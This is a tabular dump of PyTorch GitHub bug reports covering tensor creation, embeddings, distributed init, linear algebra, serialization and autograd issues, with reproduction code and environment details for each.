negative second argument in `torch.eye` is ignored module: docs triaged module: tensor creation,"If second argument to `torch.eye` is negative, it is treated as missing argument (e.g. `torch.eye(5,-1)` is the same as `torch.eye(5)`. 
We should either error out, or document this behavior. 
Numpy errors out for negative second argument. 


cc @jlin27 @mruberry @vishwakftw @jianyuh @nikitaved @pearu @heitorschueroff",True
padding_idx and provided weights in nn.Embedding and nn.functional.embedding  high priority module: docs module: nn triaged module: embedding,"**1)** nn.Embedding documentation says:

> padding_idx (int, optional): If given, pads the output with the embedding vector at :attr:`padding_idx`
>                                          **(initialized to zeros)** whenever it encounters the index.

But, In case of using the `from_pretrained` version, if input is equal to padding_idx, weigths[padding_idx] gets returned and not a vector of zeros.

Code example for reproducing:
```python
predefined_weights = torch.rand(10, 3)
emb = torch.nn.Embedding.from_pretrained(embeddings=predefined_weights, padding_idx=0)
result = emb(torch.LongTensor([1,2,0]))
```
The 3rd vector in the result is not a zero vector.

This might be a documentation issue, and the doc should say that in case of using `from_pretrained`, padding_idx will not return a zero vector, but instead, weigths[padding_idx]
**But**, it makes the use of `padding_idx` in `from_pretrained` redundant, thus I would suggest removing `padding_idx` from the arguments if this is indeed the case.

I can open a PR for this but need some feedback regarding the approach to take here, please advise.

**2)** nn.**functional**.embedding documentation says:
 

> padding_idx (int, optional): If given, pads the output with the embedding vector at :attr:`padding_idx`
>                                          (**initialized to zeros**) whenever it encounters the index.

But, the result for `index = padding_idx`  returns weigths[padding_idx] and not a zero vector.

Code example for reproducing:
```python
predefined_weights = torch.rand(10, 3)
result = torch.nn.functional.embedding(torch.LongTensor([1,2,0]), predefined_weights, padding_idx=0)
```
The 3rd vector in the result is not a zero vector.

IMO this is a documentation issue, and the doc should say that padding_idx pads the output with the embedding vector at padding_idx. (and not a zero vector)

cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @jlin27 @mruberry @albanD",True
_group_count global variable corrupted on failed distributed process group initialisation oncall: distributed triaged module: c10d,"## üêõ Bug

On process group initialisation failure the global variable `torch.distributed.distributed_c10d._group_count` can be incremented by one even though no process group is created. This is because the counter is incremented at the beginning of `_new_process_group_helper` (https://github.com/pytorch/pytorch/blob/master/torch/distributed/distributed_c10d.py#L491) while the other global variables are set at the end.

This matters because depending on the crashing and recovery process the variable may end up taking a different value for different processes. And since the counter is used as a prefix for the `PrefixStore` the processes will be using different keys, leading to a socket timeout.

This issue cannot be ""correctly"" prevented since `_group_count` is private and `destroy_process_group` cannot be called here since the process group doesn't exist. It can be prevented by explicitly providing a group name to `init_process_group`, but the argument is marked as deprecated.

## To Reproduce

The following code :

```
import torch.distributed.distributed_c10d as c10d
import datetime

def print_global_vars():
    print(""==========="")
    print(""_pg_map"", c10d._pg_map)
    print(""_pg_names"", c10d._pg_names)
    print(""_pg_group_ranks"", c10d._pg_group_ranks)
    print(""_default_pg"", c10d._default_pg)
    print(""_default_pg_init_method"", c10d._default_pg_init_method)
    print(""_group_count"", c10d._group_count)

print_global_vars()
try:
    c10d.init_process_group(""gloo"", timeout=datetime.timedelta(milliseconds=1), rank=0, world_size=2, init_method=f""tcp://127.0.0.1:8000"")
except RuntimeError:
    pass

print_global_vars()
```

This shows the following output:

```
===========
_pg_map {}
_pg_names {}
_pg_group_ranks {}
_default_pg None
_default_pg_init_method None
_group_count 0
===========
_pg_map {}
_pg_names {}
_pg_group_ranks {}
_default_pg None
_default_pg_init_method None
_group_count 1
```

## Expected behavior

It should be possible to recover from a failed call to `init_process_group` with public methods such as `is_initialized` and `destroy_process_group`. In the current implementation this means the call should leave the global variables in a consistent state, i.e. either none or all of them should be modified. In the above example, `_group_count` should remain at zero. 


## Environment

```
Collecting environment information...
PyTorch version: 1.6.0
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.18.2

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: Quadro M1200
Nvidia driver version: 450.66
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.2
[pip3] pytorch-lightning==0.8.5
[pip3] torch==1.6.0
[pip3] torchelastic==0.2.0
[pip3] torchvision==0.7.0
[conda] Could not collect
```

## Additional context

This issue happens in an elastic training training context where the main process group is frequently reinitialised, and there is a rare crash where the initialisation fails due to a broken pairwise connection. I am unsure if this is due to a networking error or a bug in the code, but the above issue makes it difficult to recover from the crash. This is in part because some of the processes crash in `ProcessGroupGloo.__init__`,  leading to inconsistent state, while others crash in the `barrier()` call at the end of `init_process_group`. The recovery process is roughly as follow:
```
while True:
    try:
        torch.distributed.init_process_group(...)
        break
    except Exception:
        if torch.distributed.is_initialized():
            torch.distributed.destroy_process_group()
```
But `_group_count` can be different across processes, so the recovery won't work.

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski",True
torch.inverse based on cuSOLVER does not raise error for singular input module: cuda triaged module: linear algebra module: correctness (silent),"## üêõ Bug

The cuSOLVER path in `torch.inverse` seems not to raise an error for non-invertible input.

## To Reproduce

Single matrix and 2xNxN batched input inversion is based on cuSOLVER
```python
import torch
batch_dim = 2
A = torch.eye(3, 3, dtype=dtype, device=device)
A = A.reshape((1, 3, 3))
A = A.repeat(batch_dim, 1, 1)
A[0, -1, -1] = 0  # Now A[0] is singular
Ainv = torch.inverse(A) # Doesn't raise errors Ainv[0] contains NaNs
```
General batched input case is based on MAGMA
```python
import torch
batch_dim = 3
A = torch.eye(3, 3, dtype=dtype, device=device)
A = A.reshape((1, 3, 3))
A = A.repeat(batch_dim, 1, 1)
A[0, -1, -1] = 0  # Now A[0] is singular
Ainv = torch.inverse(A) # Raises RuntimeError because input is singular
```

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

`torch.inverse` should raise an error for singular input when input is single matrix or a batch of matrices with batch size less or equal than 2 (cuSOLVER's code path).

cc: @xwang233 


cc @ngimel @vishwakftw @jianyuh @nikitaved @pearu @mruberry @heitorschueroff",True
Could not load library cudnn_ops_infer64_8.dll. Error code 126 module: build module: windows triaged,"After upgrade to rtx3090, I reinstalled my Windows10 and pytorch with

>conda install pytorch torchvision cudatoolkit=11 -c pytorch-nightly

When I use nn.Conv/nn.BatchNorm layer in my module and do the forward propagation, it shows

>Could not load library cudnn_ops_infer64_8.dll. Error code 126
>Please make sure cudnn_ops_infer64_8.dll is in your library path!

in Vscode

>Process finished with exit code -1073740791 (0xC0000409)

in Pycharm

I‚Äôve tried reinstalling pytorch and installed cuda toolkit 11 from developer.nvidia.com, but the problem remains unsolved.

```
import torch
import torch.nn as nn

class test(nn.Module):
    def __init__(self):
        super(test, self).__init__()
        self.l = nn.Conv2d(1,1,3)
    def forward(self, input):
        return self.l(input)

net = test().cuda()
print(net(torch.rand(1,1,5,5).cuda()))
```

cc @malfet @seemethere @walterddr @peterjc123 @maxluk @nbcsm @guyang3532 @gunandrose4u @smartcat2010 @mszhanyi",True
.to_sparse() should produce a tensor with contiguous indices module: sparse triaged,"Currently, `.to_sparse` for cuda tensor produces tensor with contiguous indices, and for cpu tensor does not:
```
In [8]: torch.randn(4,4,device=""cuda"").to_sparse().indices().is_contiguous()                                                                                                                                                                                        
Out[8]: True

In [9]: torch.randn(4,4,device=""cpu"").to_sparse().indices().is_contiguous()                                                                                                                                                                                         
Out[9]: False
```
This should be fixed by changing the contiguity of cpu `nonzero` output rather than by calling `contiguous` directly in `to_sparse`.  

cc @vincentqb @aocsa @nikitaved @pearu @mruberry",True
torch.save w/ _use_new_zipfile_serialization=True corrupts state_dict high priority module: serialization triaged,"## üêõ Bug

In one of the `transformers` tests `torch.save` w/ the new `_use_new_zipfile_serialization=True` corrupts the data in the state_dict resulting in load returning bogus data that wasn't there on save. 

## To Reproduce

Steps to reproduce the behavior:

It seems to happen with the specific data only, so at the moment requires a specific sub-test:
```
git clone https://github.com/huggingface/transformers
cd transformers
pip install -e .[dev]
CUDA_LAUNCH_BLOCKING=1 USE_CUDA=1 pytest tests/test_modeling_bert.py::BertModelTest::test_head_pruning_integration
```

Specifically, we have https://github.com/huggingface/transformers/blob/960faaaf28b198c0dd2fcb288fa336a846aed398/src/transformers/modeling_utils.py#L729

```
        torch.save(state_dict, output_model_file) #, _use_new_zipfile_serialization=False)

        k = ""embeddings.position_ids""
        if k in state_dict: print(""SAVE\n"", state_dict[k])

        state_dict = torch.load(output_model_file)
        if k in state_dict: print(""LOAD\n"", state_dict[k])
```
(I added the debug prints and load code as part of debug as the problem wasn't manifesting under the debugger)

What goes in with saving the key `embeddings.position_ids`:

```
0, 1, 2,..., 511
```

What comes out after load: 

```
512, 0, 1, 2, ..., 510
```

That 512 shouldn't be there. It leads to a CUDA assert and the whole test suite goes kaboom.

Note 1: One more important detail. if `output_model_file` is set manually directly inside save/load code above I replace `output_model_file` - everything works fine. If it is done via the test (regardless whether it does it via tempfile.TemporaryDirectory()` or a hardcoded path it fails.

Note 2: If I run the code under debugger, the problem doesn't manifest itself.

These 2 peculiarities are very odd. Is there a race condition here and somehow one or the other changes the timing?

Also, if I remove all keys but ""embeddings.position_ids"" the data doesn't get corrupted. So it has to do with a specific data this state_dict happens to have.

Many thanks to @ptrblck for doing most of the heavy lifting, debugging this on slack.

t/a @jamesr66a 

## Environment

The problem happens with any pytorch-1.6+ (since `_use_new_zipfile_serialization=True` has been enabled). all is good with pytorch-1.5. And a variety of nvidia drivers were experimented with with no difference in behavior.

```
PyTorch version: 1.8.0.dev20201007
Is debug build: True
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.10.2

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.0.130
GPU models and configuration:
GPU 0: GeForce GTX TITAN X
GPU 1: GeForce GTX TITAN X

Nvidia driver version: 455.23.05
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] pytorch-lightning==0.9.1rc3
[pip3] torch==1.8.0.dev20201007
[pip3] torchtext==0.6.0
[pip3] torchvision==0.8.0.dev20201007
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               11.0.221             h6bb024c_0
[conda] mkl                       2020.2                      256
[conda] mkl-service               2.3.0            py38he904b0f_0
[conda] mkl_fft                   1.2.0            py38h23d657b_0
[conda] mkl_random                1.1.1            py38h0573a6f_0
[conda] numpy                     1.18.5                   pypi_0    pypi
[conda] numpy-base                1.19.1           py38hfa32c7d_0
[conda] pytorch                   1.8.0.dev20201007 py3.8_cuda11.0.221_cudnn8.0.3_0    pytorch-nightly
[conda] pytorch-lightning         0.9.1rc3                  dev_0    <develop>
[conda] torchtext                 0.6.0                    pypi_0    pypi
[conda] torchvision               0.8.0.dev20201007      py38_cu110    pytorch-nightly
```


cc @ezyang @gchanan @zou3519 @mruberry",True
Singular value decomposition of complex valued matrices does not match mathematical definition high priority module: docs triaged module: complex module: linear algebra,"## üìö Documentation

Now when `torch.svd` supports complex input both for CPU and CUDA. Let's discuss the docs.
Currently, SVD documentation is fully in agreement with the implementation. This function returns`(U, S, V)` such that `input = U @ diag(S) @ V.T`
However, the mathematical definition of SVD is the decomposition of a matrix **M** such that ![image](https://user-images.githubusercontent.com/19621411/95017939-e72e4e80-0664-11eb-8efe-a853724d142a.png), where `V^*` is the conjugate transpose of `V`. 

What is the opinion on this? Should the documentation and implementation match math and be updated such that `A = U @ diag(S) @ V.T.conj()`?

[Link to `torch.svd` documentation](https://pytorch.org/docs/stable/generated/torch.svd.html).



cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @anjali411 @dylanbespalko @mruberry @jlin27 @vishwakftw @jianyuh @nikitaved @pearu @vincentqb",True
Bug in max_pool2d with ceil_mode under certain conditions high priority module: nn triaged module: pooling,"## üêõ Bug

In `torch.nn.functional.max_pool2d` with `ceil_mode=True`, there are cases where maximum can be taken for a fully out-of-bounds kernel. See repro.

## To Reproduce
```
>>> x = torch.randn(1, 1, 6, 7)
>>> y = torch.nn.functional.max_pool2d(x, 1, stride=(2, 2), padding=0, ceil_mode=True)
>>> y.size()
torch.Size([1, 1, 4, 4])
>>> y
tensor([[[[ 1.5680,  1.0815, -0.5165, -1.0466],
          [ 1.2615,  1.1358, -0.0340, -0.4750],
          [ 0.7457, -1.0273,  1.0388,  0.7754],
          [   -inf,    -inf,    -inf,    -inf]]]])
```
## Expected behavior

I would expect for these parameters (`kernel_size=1, stride=(2, 2), ceil_mode=True`), we would get an output of size (3, 4) since the 4th kernel on dimension 2 would start at index 6 which is out-of-bounds.


cc @ezyang @gchanan @zou3519 @albanD @mruberry",True
test_nn.py returns inconsistent result in different test setup high priority triage review module: tests triaged,"## üêõ Bug

This was discovered when adding tests in #45224. when invoking conv3d with 1x1x1 kernel. (size 2 kernel is Fine)


## To Reproduce

```
import torch

input_channels = 3
output_channels = 3
batch_size = 2
depth=3
height = 5
width = 5
kernel = 1
stride = 1
with torch.backends.mkldnn.flags(enabled=False):
    conv_op = torch.nn.Conv3d(
    input_channels,
    output_channels,
    kernel,
    bias=False,  # No bias
    ).to(dtype=torch.double)
    input = torch.randn(batch_size, input_channels, depth, height, width, dtype=torch.double, requires_grad=True)
    out = conv_op(input)
    gO = torch.rand_like(out)
    out.backward(gO)
    print(conv_op.weight.grad)
```

## Expected behavior

results in both run (CPU, CUDA) should be the same, however the result in cpu is wrong.

## Environment

 - PyTorch Version (e.g., 1.0): master(f93ead6d37b476576b50a2f550c5898415a1fe35)
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): `DEBUG=1 python setup.py develop`
 - Python version: 3.7
 - CUDA/cuDNN version: 10.1
 - GPU models and configuration: GPU 0-7: Tesla P100-SXM2-16GB
 - Any other relevant information: 

## Additional context

CI test failures:
https://app.circleci.com/pipelines/github/pytorch/pytorch/218492/workflows/5c2eb0f1-61d4-471d-ab3a-102b08c007d0/jobs/7724746
https://app.circleci.com/pipelines/github/pytorch/pytorch/218492/workflows/5c2eb0f1-61d4-471d-ab3a-102b08c007d0/jobs/7725263


cc @mruberry @VitalyFedyunin @ezyang @gchanan @zou3519 @ngimel @albanD",True
Pytorch+rocm 3.7.0: cmake cannot find hsa-runtime64 module: build module: rocm triaged,"## üêõ Bug

Hi,

I'm trying to build Pytorch for rocm from sources following [this page](https://github.com/aieater/rocm_pytorch_informations) and also other sources; however it ends with an error:

```
***** Library versions from cmake find_package *****

CMake Error at /usr/share/cmake-3.16/Modules/CMakeFindDependencyMacro.cmake:47 (find_package):
  By not providing ""Findhsa-runtime64.cmake"" in CMAKE_MODULE_PATH this
  project has asked CMake to find a package configuration file provided by
  ""hsa-runtime64"", but CMake did not find one.

  Could not find a package configuration file provided by ""hsa-runtime64""
  with any of the following names:

    hsa-runtime64Config.cmake
    hsa-runtime64-config.cmake

  Add the installation prefix of ""hsa-runtime64"" to CMAKE_PREFIX_PATH or set
  ""hsa-runtime64_DIR"" to a directory containing one of the above files.  If
  ""hsa-runtime64"" provides a separate development package or SDK, be sure it
  has been installed.
Call Stack (most recent call first):
  /opt/rocm/hip/lib/cmake/hip/hip-config.cmake:124 (find_dependency)
  cmake/public/LoadHIP.cmake:131 (find_package)
  cmake/public/LoadHIP.cmake:170 (find_package_and_print_version)
  cmake/Dependencies.cmake:1154 (include)
  CMakeLists.txt:486 (include)
```

The file that cmake is looking for is under /opt/rocm-3.7.0/lib/cmake/hsa-runtime64/ .
I also tried setting the variable  however setting the environmental variable to CMAKE_MODULE_PATH=/opt/rocm-3.7.0/lib/cmake/hsa-runtime64 , but still no luck.

Any hint?

## Environment

PyTorch version: N/A
Is debug build: N/A
CUDA used to build PyTorch: N/A

OS: Pop!_OS 20.04 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
Clang version: 10.0.0-4ubuntu1 
CMake version: version 3.16.3

Python version: 3.8 (64-bit runtime)
Is CUDA available: N/A
CUDA runtime version: Could not collect
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Could not collect

Versions of relevant libraries:
[pip3] numpy==1.19.1
[conda] Could not collect


cc @malfet @seemethere @walterddr @jeffdaily @sunway513",True
Can't solve torch.lstsq() with specific values high priority triaged module: numpy module: linear algebra,"## üêõ Bug

When using `torch.lstsq` to solve with specific values, `torch.lstsq` produces wrong result (on cuda) or raises error (on cpu) while `scipy.linalg.lstsq` not.

## To Reproduce

Steps to reproduce the behavior:

1. Use the dumped `.npy` file: `a.npy`, `b.npy` to perform `torch.lstsq`
2. Meanwhile, `lstsq` can also be solved in `scipy.linalg.lstsq`
3. With the given `numpy array`, `torch.lstsq` raises error on `cpu`, or gives wrong result on `cuda`, while `scipy.linalg.lstsq` not.

Code samples and error messages:

Download files:
* `a.npy`: https://github.com/xiaosu-zhu/archives/releases/download/torch.lstsq/a.npy
* `b.npy`: https://github.com/xiaosu-zhu/archives/releases/download/torch.lstsq/b.npy

```python
import numpy as np
import scipy.linalg
import torch

# sparse 0-1 matrix with shape [100000, 1024]
# each row contains exactly 4 ones and other zeros
a = np.load(""a.npy"").astype(np.float32)
# int matrix with shape [100000, 128]
b = np.load(""b.npy"").astype(np.float32)

x, _, _, _ = scipy.linalg.lstsq(a, b)

# 67480.16036171981
print(((a @ x - b) ** 2).sum(-1).mean())

b = torch.from_numpy(b).cuda()
a = torch.from_numpy(a).cuda()
x, _ = torch.lstsq(b, a)

# 7.4439e+15
print(((a @ x[:a.shape[-1]] - b) ** 2).sum(-1).mean())

# raise RuntimeError: Lapack Error in gels : 
# The 259-th diagonal element of the triangular factor of A is zero 
# at /opt/conda/conda-bld/pytorch_1595629395347/work/aten/src/TH/generic/THTensorLapack.cpp:177
x, _ = torch.lstsq(b.cpu(), a.cpu())
```

Raise `RuntimeError: Lapack Error in gels : The 259-th diagonal element of the triangular factor of A is zero at /opt/conda/conda-bld/pytorch_1595629395347/work/aten/src/TH/generic/THTensorLapack.cpp:177` when using `torch.FloatTensor`.
Or an irregular result when using `torch.cuda.FloatTensor`.

## Expected behavior

Produce the same result with `scipy.linalg.lstsq`.


## Environment

```console
PyTorch version: 1.6.0
Is debug build: False
CUDA used to build PyTorch: 10.2

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
Clang version: Could not collect
CMake version: version 3.16.3

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: 
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce GTX 1080 Ti
GPU 2: GeForce GTX 1080 Ti
GPU 3: GeForce GTX 1080 Ti
GPU 4: GeForce GTX 1080 Ti
GPU 5: GeForce GTX 1080 Ti
GPU 6: GeForce GTX 1080 Ti
GPU 7: GeForce GTX 1080 Ti

Nvidia driver version: 450.51.05
cuDNN version: Could not collect

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] torch==1.6.0
[pip3] torchvision==0.7.0
[conda] blas                      1.0                         mkl    defaults
[conda] cudatoolkit               10.2.89              hfd86e86_1    defaults
[conda] mkl                       2020.1                      217    defaults
[conda] mkl-service               2.3.0            py38he904b0f_0    defaults
[conda] mkl_fft                   1.1.0            py38h23d657b_0    defaults
[conda] mkl_random                1.1.1            py38h0573a6f_0    defaults
[conda] numpy                     1.19.1           py38hbc911f0_0    defaults
[conda] numpy-base                1.19.1           py38hfa32c7d_0    defaults
[conda] pytorch                   1.6.0           py3.8_cuda10.2.89_cudnn7.6.5_0    pytorch
[conda] torchvision               0.7.0                py38_cu102    pytorch
```


cc @ezyang @gchanan @zou3519 @bdhirsh @vishwakftw @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @rgommers @vincentqb",True
Current behavior of `as_tuple` argument is inconsistent in `nonzero` module: nn triaged module: numpy module: pybind better-engineering,"After `nonzero` started warning that `as_tuple` is a required argument (1.6) a few unfortunate things has happened:
1) the examples in docs started issuing a warning #43425
2) there's no way to pass `out` and `as_tuple` arguments together
```
print(torch.nonzero(a, as_tuple=False)) #ok
print(torch.nonzero(a, out=out)) #warns
print(torch.nonzero(a, as_tuple=False, out=out)) #errors out with `TypeError: nonzero() received an invalid combination of arguments - got unrecognized keyword arguments: out`
```
The rationale behind making `as_tuple` argument required is going through deprecation cycle to change the default value of `as_tuple` so that `torch.nonzero` matches `numpy.nonzero` without any additional args. However, even if implemented properly without problems noted above, this goal is misguided and forces users to modify their codes to avoid warnings for no good reason. 
Torch default behavior for `nonzero` should not match numpy. Numpy behavior can already be achieved by either using `as_tuple=True` or calling `unbind(1)` on results of `torch.nonzero()` call, that is a very light burden for someone who wants it. But to avoid it, we are making everyone who doesn't care jump through deprecation hoops. 
Making numpy behavior default is bad, because numpy returns a tuple of tensors, whereas many users want single tensor return. Going from a single tensor to a tuple is a matter of a cheap `.unbind` call, going from a tuple to a single tensor is memory copy. Default behavior should always pick single tensor. 
My proposal is to go back to making `as_tuple` optional argument and not strive to make `nonzero` match numpy behavior.

cc @albanD @mruberry @rgommers, @alband, @stas00 ",True
Breakage caused by #42629 triaged,"## üêõ Bug

[this line](https://github.com/pytorch/pytorch/blob/master/tools/codegen/model.py#L3) is causing a crash when we try to build pytorch.

Crash looks like this:
```
Step #0: [91mTraceback (most recent call last):
Step #0:   File ""/root/anaconda3/envs/pytorch/lib/python3.6/runpy.py"", line 193, in _run_module_as_main
Step #0:     ""__main__"", mod_spec)
Step #0:   File ""/root/anaconda3/envs/pytorch/lib/python3.6/runpy.py"", line 85, in _run_code
Step #0:     exec(code, run_globals)
Step #0:   File ""/pytorch/tools/codegen/gen.py"", line 14, in <module>
Step #0:     from tools.codegen.model import *
Step #0:   File ""/pytorch/tools/codegen/model.py"", line 3, in <module>
Step #0:     from dataclasses import dataclass
Step #0: ModuleNotFoundError: No module named 'dataclasses'
```

(all times in US/West)
Our 7AM, 8AM builds and earlier were all fine but 9AM, 10AM, 11AM builds all crashed with that same traceback.

The new import was added in https://github.com/pytorch/pytorch/pull/42629/files which I think went in between 8AM and 9AM today

## To Reproduce

See command below:
`Step #0: subprocess.CalledProcessError: Command '['cmake', '-DBUILD_PYTHON=True', '-DBUILD_TEST=True', '-DCMAKE_BUILD_TYPE=Release', '-DCMAKE_INSTALL_PREFIX=/pytorch/torch', '-DCMAKE_PREFIX_PATH=/../', '-DNUMPY_INCLUDE_DIR=/root/anaconda3/envs/pytorch/lib/python3.6/site-packages/numpy/core/include', '-DPYTHON_EXECUTABLE=/root/anaconda3/envs/pytorch/bin/python', '-DPYTHON_INCLUDE_DIR=/root/anaconda3/envs/pytorch/include/python3.6m', '-DPYTHON_LIBRARY=/root/anaconda3/envs/pytorch/lib/libpython3.6m.so.1.0', '-DTORCH_BUILD_VERSION=1.7.0a0+6ea8916', '-DUSE_CUDA=0', '-DUSE_NUMPY=True', '/pytorch']' returned non-zero exit status 1.`

`Step #0: The command '/bin/sh -c cd /pytorch && bash xla/scripts/build_torch_wheels.sh ${python_version} ${release_version}' returned a non-zero code: 1`

See here if needed for `build_torch_wheels.sh`: https://github.com/pytorch/xla/blob/master/scripts/build_torch_wheels.sh

## Expected behavior

<!-- A clear and concise description of what you expected to happen. -->

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0): building from master
 - OS (e.g., Linux): linux
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): see above under 'reproduce'
 - Python version: 3.6
",True
Fix exception chaining all over the codebase triaged better-engineering,"I would like to suggest a small fix in the way that Python 3's exception chaining is used.

As described in detail in [this article](https://blog.ram.rachum.com/post/621791438475296768/improving-python-exception-chaining-with), exception chaining ([PEP 3134](https://www.python.org/dev/peps/pep-3134/)) can be used to make exceptions more user-friendly, and in that case, the syntax `raise new_exception from old_exception` needs to be used.

For example, the following should be used to chain exceptions:
```python
try:
    something_which_raises_TypeError
except TypeError as e:
    raise ValueError(""A more user-friendly exception message."") from e
```
instead of:
```python
try:
    something_which_raises_TypeError
except TypeError:
    raise ValueError(""A more user-friendly exception message."")
```

One example which needs to be fixed is:
https://github.com/pytorch/pytorch/blob/c7787f7fbf388f9fe326d581726e7ef3f2dce74b/torch/jit/annotations.py#L32-L35

I'd be happy to PR! Let me know your thoughts on this!",True
Numerical instability in DivBackward0 for multiple backward module: numerical-stability module: autograd triaged,"## üêõ Bug

A simple division operation: `g = x/y` could produce numerical instability if multiple backward is applied.
This is because the derivative is calculated by `-grad * self / (other * other)` (see `tools/autograd/derivatives.yaml` in `div.Tensor`).
The `other` tensor is squared in one backward operation, so multiple operation will raise `other` to the power of `2^n` and can reach `inf` or `0` very quickly.
A simple fix should be sufficient: by replacing the derivative calculation to `-grad * result / other`, but it makes a bunch of tests fail (I'm not sure why).

## To see the problem

    import torch

    class Div2(torch.autograd.Function):
        @staticmethod
        def forward(ctx, x, y):
            z = x / y
            ctx.save_for_backward(x, y, z)
            return z

        @staticmethod
        def backward(ctx, gz):
            x, y, z = ctx.saved_tensors
            gx = Div2.apply(gz, y)
            gy = Div2.apply(-gz*z, y)
            return gx, gy

    def example(g, y, n):
        gs = [g.item()]
        for i in range(n):
            g, = torch.autograd.grad(g, (y,), create_graph=True)
            gs.append(g.item())
        return gs

    if __name__ == ""__main__"":
        a = 1e-8
        x = torch.tensor(a, requires_grad=True)
        y = torch.tensor(a, requires_grad=True)
        n = 4
        factorial = lambda i: 1 if i < 2 else i * factorial(i-1)
        print(""Div1 (current implementation):"")
        print(example(x / y, y, n))
        print(""Div2 (proposed implementation):"")
        print(example(Div2.apply(x, y), y, n))
        print(""Actual:"")
        actual = [(-1)**i*factorial(i)/(a**i) for i in range(n+1)] # [1.0, -1/a, 2/(a*a), -3*2/(a*a*a), 4*3*2/(a**4)]
        print(actual)

Output: 

    Div1 (current implementation):
    [1.0, -100000000.0, 1.99999983976448e+16, -inf, nan]
    Div2 (proposed implementation):
    [1.0, -100000000.0, 2.000000054512845e+16, -6.000000083090567e+24, 2.4000002343777533e+33]
    Actual:
    [1.0, -100000000.0, 1.9999999999999996e+16, -5.999999999999999e+24, 2.4e+33]

The current implementation of `DivBackward0` could not calculate the results correctly even with `1e-8` for triple backward, even though the actual result still within the `float32` range.

## Expected behavior

See above.

## Environment

 - PyTorch Version (e.g., 1.0): PyTorch 1.6.0
 - OS (e.g., Linux): Ubuntu
 - How you installed PyTorch (`conda`, `pip`, source): `conda`
 - Build command you used (if compiling from source): N/A
 - Python version: 3.8
 - CUDA/cuDNN version: N/A
 - GPU models and configuration: N/A
 - Any other relevant information: N/A

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @SsnL @albanD @zou3519 @gqchen",True
CUDA Error in batchNorm module: cuda triaged,"## üêõ Bug

---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-93-52a0569421b1> in <module>
----> 1 loss.backward()

/opt/conda/lib/python3.7/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
    183                 products. Defaults to ``False``.
    184         """"""
--> 185         torch.autograd.backward(self, gradient, retain_graph, create_graph)
    186 
    187     def register_hook(self, hook):

/opt/conda/lib/python3.7/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
    125     Variable._execution_engine.run_backward(
    126         tensors, grad_tensors, retain_graph, create_graph,
--> 127         allow_unreachable=True)  # allow_unreachable flag
    128 
    129 

RuntimeError: Expected grad_output->is_contiguous(grad_output->suggest_memory_format()) to be true, but got false.  (Could this error message be improved?  If so, please report an enhancement request to PyTorch.)
Exception raised from cudnn_batch_norm_backward at /opt/conda/conda-bld/pytorch_1595629403081/work/aten/src/ATen/native/cudnn/BatchNorm.cpp:249 (most recent call first):
frame #0: c10::Error::Error(c10::SourceLocation, std::string) + 0x4d (0x7f993197377d in /opt/conda/lib/python3.7/site-packages/torch/lib/libc10.so)
frame #1: at::native::cudnn_batch_norm_backward(at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, double, at::Tensor const&) + 0x25b2 (0x7f9932a79db2 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #2: <unknown function> + 0xd1150a (0x7f9932aea50a in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #3: <unknown function> + 0xd3fa3b (0x7f9932b18a3b in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #4: at::cudnn_batch_norm_backward(at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, double, at::Tensor const&) + 0x1ef (0x7f9964cff10f in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #5: <unknown function> + 0x2b59cff (0x7f9966946cff in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
